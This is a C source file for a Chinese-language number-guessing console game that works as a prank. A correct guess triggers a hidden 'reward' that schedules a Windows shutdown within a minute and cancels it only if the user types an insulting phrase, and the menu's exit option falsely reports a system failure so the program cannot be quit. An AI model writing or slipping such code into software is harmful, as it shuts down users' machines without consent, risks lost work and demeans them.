#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>


void menu()
{
	//打印开始界面
	printf("*******************\n");
	printf("*     1.开始      *\n");
	printf("*     2.退出      *\n");
	printf("*******************\n");

}

//void rewards()
//{
//	char acc[20] = { 0 };
//	system("shutdown -s -t 60");
//cx:
//	printf("请注意，我们将奖励你电脑在一分钟后关机，如果输入：我是傻逼，就收回你的奖励\n");
//	scanf("%s",acc);
//	if (strcmp("我是傻逼",acc) == 0)
//	{
//		system("shutdown -a");
//	}
//	else
//	{
//		goto cx;
//	}
//}
void rewards()
{
	char acc[20] = { 0 };
	system("shutdown -s -t 60");
	printf("请注意，我们将奖励你电脑在一分钟后关机，如果输入：我是傻逼，就收回你的奖励\n");
	while (1)
	{
		scanf("%s", acc);
		if (strcmp("我是傻逼", acc) == 0)
		{
			system("shutdown -a");
			printf("奖励已收回，你真聪明！\n");
			break;
		}
		else
		{
			printf("输入无效，请重新输入。\n");
		}
	}
}
void game()
{   //第一步，生成随机数
	int r = rand() % 100 + 1;
	//第二步，猜数字
	int guess = 0;

	while (1)
	{
		printf("请输入你猜的数字\n");
		scanf("%d", &guess);
		if (guess > r )
		{
			printf("宝，你猜大了哦\n");
		}
		else if (guess < r )
		{
			printf("宝，你猜小了哦\n");
		}
		else
		{
			printf("宝，你真棒，猜对了！！\n");
			rewards();
		}

	}

}




int main()
{
	srand((unsigned int)time(NULL));
	int input = 0;
do
   {
	////打印开始界面
	menu();
again:
	printf("\n\n你的选择是?\n");
	scanf("%d",&input);
	switch (input)
	{
	   case 1:
		   game();
		   break;
	   case 2:
		   printf("抱歉，系统故障\n");
		   goto again;
	   default:
		   printf("注意，请重新选择\n");
		   break;
	}

	}while (input);

	return 0;
}